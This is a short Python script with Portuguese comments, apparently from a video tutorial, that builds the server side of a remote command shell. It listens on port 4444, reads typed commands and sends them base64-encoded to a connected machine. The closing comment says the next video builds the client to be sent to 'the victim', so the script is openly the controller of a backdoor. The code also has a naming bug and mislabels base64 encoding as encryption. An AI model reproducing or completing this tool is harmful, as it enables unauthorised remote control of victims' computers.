# Começamos importando o socket
# O base64 é para encriptar os dados
import socket
import base64
import os

s = socket.socket(socket.AF_INET, sock.SOCK_STREAM)
# A letra "s" equivale a criação e abertura do servidor

# s.bind equivale a escuta de qualquer ip na porta 4444(Você mesmo pode escolher a porta desde que não seja uma das escolhidas de antemão)
s.bind(('', 4444))
s.listen(5)

def base64_enco(strings):
	return base64.b64encode(strings)
# Aqui foi definido a "criptografia dos dados enviados"

def principal():
	conn, addr = s.accept()
	while True:
		data = conn.recv(1024)
		print(data)
		comandos = raw_input("CMD> ")
		saida = base64_enco(comandos)
		conn.send(saida)

# Aqui foi criado onde daremos o comando do servidor

def cliente():
	principal()

cliente()

# Terminamos o servidor, essa parte de baixo é encarregada por repetir a parte dos comandos

# O próximo vídeo vai ser a criação do cliente o qual enviaremos para vítima, espero que tenham gostado, deixarei o link com o script na descrição... <3 BJOO
